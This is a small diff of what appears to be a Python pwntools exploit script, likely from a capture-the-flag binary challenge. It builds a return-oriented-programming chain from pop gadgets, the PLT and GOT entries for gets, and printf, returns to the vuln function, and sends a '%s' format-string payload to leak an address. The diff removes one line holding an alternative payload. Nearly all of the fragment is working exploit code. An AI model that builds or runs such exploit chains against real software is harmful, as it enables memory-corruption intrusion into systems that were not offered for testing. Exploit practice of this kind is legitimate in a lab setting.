@@ -26,7 +26,6 @@ if __name__ == '__main__':
     print(s.recvuntil(': ').decode())
     exp = p64(bss)*2+p64(popedi)+p64(bss)+p64(prog.plt[b'gets'])+p64(pop2esi)+p64(bss)*2+p64(popedi)+p64(prog.got[b'gets'])+p64(printf_prog)+p64(prog.symbols[b'vuln'])+b'\n'
     exp1=b'%s'+b'\n'
-    exp2=p64(prog.symbols[b'_start'])*4+b'\n'
     exp+=exp1
     s.send(exp)
     print(exp)
